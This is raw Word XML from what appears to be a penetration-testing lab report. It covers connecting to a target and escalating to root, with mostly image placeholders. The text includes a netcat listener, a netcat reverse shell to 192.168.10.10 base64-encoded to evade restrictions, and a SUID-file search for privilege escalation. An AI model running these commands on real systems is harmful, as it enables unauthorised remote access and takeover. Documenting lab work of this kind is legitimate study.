    <w:p w14:paraId="195C5C34" w14:textId="77777777" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DE74539" w14:textId="77777777" w:rsidR="00386BE8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Connecting to the Target System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2CD3E4" w14:textId="23166577" w:rsidR="00CC0981" w:rsidRDefault="009854A9" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve">an illustration showing how to set up a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve"> listener on the attacker's computer with the command </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009854A9">
        <w:t>lvnp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve"> 4444 </w:t>
      </w:r>
      <w:r w:rsidRPr="009854A9">
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidRPr="009854A9">
        <w:t xml:space="preserve"> get ready for the target system's incoming connection. Ideally, this picture would show the terminal turned on and ready for a connection.</w:t>
      </w:r>
      <w:r w:rsidR="00CC0981" w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C09A370" wp14:editId="4B47257C">
            <wp:extent cx="5486400" cy="2254885"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="110964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395" name="Picture 1" descr="A screenshot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2254885"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3D0090" w14:textId="4B2F2D47" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6BE8D56E" wp14:editId="5E50D897">
            <wp:extent cx="5163271" cy="1209844"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="2275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008" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5163271" cy="1209844"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="569111FA" w14:textId="4DF2F48A" w:rsidR="004031C3" w:rsidRDefault="004031C3" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="004031C3">
        <w:t xml:space="preserve">A terminal snapshot showing the process of encoding the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004031C3">
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004031C3">
        <w:t xml:space="preserve"> -e /bin/bash 192.168.10.10 4444 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004031C3">
        <w:t>command</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004031C3">
        <w:t xml:space="preserve"> with base64, resulting in an encoded string ready to be used for bypassing restrictions on the target system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242EB943" w14:textId="152842A4" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="44915A14" wp14:editId="2AB00A60">
            <wp:extent cx="5486400" cy="972185"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="18658817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1702" name="Picture 1" descr="A screen shot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="972185"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF28D1F" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DA4C814" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E76ACFA" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="026ED806" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57C568CD" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CB90C22" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6849EF61" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E5F617D" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77253ED1" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A9D8445" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="515DD89F" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FB52F4D" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="715D9516" w14:textId="7C9C3B2E" w:rsidR="00386BE8" w:rsidRDefault="00000000" w:rsidP="004031C3">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="2910"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>Getting Root Account</w:t>
      </w:r>
      <w:r w:rsidR="004031C3">
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1686E043" w14:textId="72DCE4BB" w:rsidR="004031C3" w:rsidRPr="004031C3" w:rsidRDefault="004031C3" w:rsidP="004031C3">
      <w:r w:rsidRPr="004031C3">
        <w:t>An image capturing the terminal output of the find / -perm -u=s -type f 2&gt;/dev/null command, which is used to search for files with SUID permissions that could potentially be exploited by the '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004031C3">
        <w:t>apache</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004031C3">
        <w:t>' user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C367633" w14:textId="3B839200" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4184E351" wp14:editId="221161AF">
            <wp:extent cx="5068007" cy="4058216"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="114884772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47724" name="Picture 1" descr="A computer screen shot of a computer program&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5068007" cy="4058216"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E47562" w14:textId="635B7E84" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48118191" wp14:editId="464E1F5D">
            <wp:extent cx="5486400" cy="805180"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="6000046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4676" name="Picture 1" descr="A screen shot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="805180"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E345033" w14:textId="719E8CCF" w:rsidR="00CC0981" w:rsidRDefault="00CC0981" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC0981">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6A8CE286" wp14:editId="3E6E03BB">
            <wp:extent cx="5486400" cy="1129665"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="830718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8504" name="Picture 1" descr="A screenshot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1129665"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F856774" w14:textId="6E1DAB74" w:rsidR="00050927" w:rsidRDefault="00050927" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00050927">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="034769F8" wp14:editId="1C779CEB">
            <wp:extent cx="5486400" cy="1538605"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="3211227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22772" name="Picture 1" descr="A screen shot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1538605"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="490C8DD3" w14:textId="04071555" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1ECA109C" wp14:editId="48EBE306">
            <wp:extent cx="2848373" cy="1152686"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="138663516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5168" name="Picture 1" descr="A computer screen with white text&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2848373" cy="1152686"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB4885A" w14:textId="1F04501A" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0381B956" wp14:editId="22AFBB16">
            <wp:extent cx="1695687" cy="914528"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1862460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60374" name="Picture 1" descr="A screenshot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId23"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="1695687" cy="914528"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="507A849D" w14:textId="705EC913" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00CC0981">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7F54C6B9" wp14:editId="70699E93">
            <wp:extent cx="5486400" cy="5467985"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="403128444"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28444" name="Picture 1" descr="A screen shot of a computer screen&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId24"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="5467985"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00CF74B0" w:rsidSect="001A2C2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281368">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="2013099483">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="723992586">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="2060788570">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="194389728">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1628467321">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1745830866">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1002511908">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="112257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27"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00191EF7"/>
    <w:rsid w:val="001A2C2D"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00386BE8"/>
    <w:rsid w:val="004031C3"/>
    <w:rsid w:val="00552084"/>
    <w:rsid w:val="009854A9"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AC4751"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CC0981"/>
    <w:rsid w:val="00CF74B0"/>
    <w:rsid w:val="00E12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BF9A3"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{9072535E-1D33-4C13-91E7-6A427B768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031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Barros</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-04-09T19:27:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-04-12T04:13:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>